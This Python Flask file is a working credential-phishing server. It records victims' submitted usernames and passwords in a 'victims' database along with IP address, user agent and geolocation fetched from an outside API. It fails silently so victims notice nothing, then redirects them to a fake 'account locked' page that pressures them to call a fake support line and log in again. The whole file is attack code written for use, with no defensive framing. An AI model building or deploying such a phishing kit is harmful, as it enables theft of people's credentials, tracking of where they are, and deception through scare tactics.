from flask import Flask, request, render_template, redirect, url_for
import sqlite3
import requests
import datetime

app = Flask(__name__)

# Initialize DB for stolen creds
def init_db():
    conn = sqlite3.connect('logs.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  username TEXT,
                  password TEXT,
                  ip TEXT,
                  user_agent TEXT,
                  timestamp DATETIME,
                  geolocation TEXT)''')
    conn.commit()
    conn.close()

# Log stolen credentials + IP/Geo
def log_victim(username, password, ip, user_agent):
    try:
        # Get rough geolocation (free API)
        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
        geolocation = f"{geo.get('country')}, {geo.get('city')}" if geo.get('status') == 'success' else "Unknown"

        conn = sqlite3.connect('logs.db')
        c = conn.cursor()
        c.execute("INSERT INTO victims (username, password, ip, user_agent, timestamp, geolocation) VALUES (?, ?, ?, ?, ?, ?)",
                  (username, password, ip, user_agent, datetime.datetime.now(), geolocation))
        conn.commit()
        conn.close()
    except Exception as e:
        pass  # Silent fail (no errors for the victim)

# Main phishing route
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')

        # Log the poor fuker
        log_victim(username, password, ip, user_agent)

        # Redirect to fake "security alert" page
        return redirect(url_for('security_alert'))

    return render_template('login.html')

# Fake "Account Locked" page (panics victim into resubmitting)
@app.route('/security-alert')
def security_alert():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>SECURITY ALERT</title>
        <style>
            body { background-color: #ffebee; font-family: Arial; text-align: center; padding: 50px; }
            .alert { color: #d32f2f; font-size: 24px; font-weight: bold; }
            .fake-support { margin-top: 30px; font-size: 18px; }
        </style>
    </head>
    <body>
        <div class="alert">⚠️ SECURITY ALERT: UNAUTHORIZED LOGIN ATTEMPT DETECTED ⚠️</div>
        <div class="fake-support">
            Your account has been temporarily locked.<br>
            <strong>Call support immediately:</strong> +1 (800) 555-FAKE<br><br>
            <button onclick="window.location.href='/'">Retry Login</button>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=80, debug=False)  # Run on port 80 (HTTP)
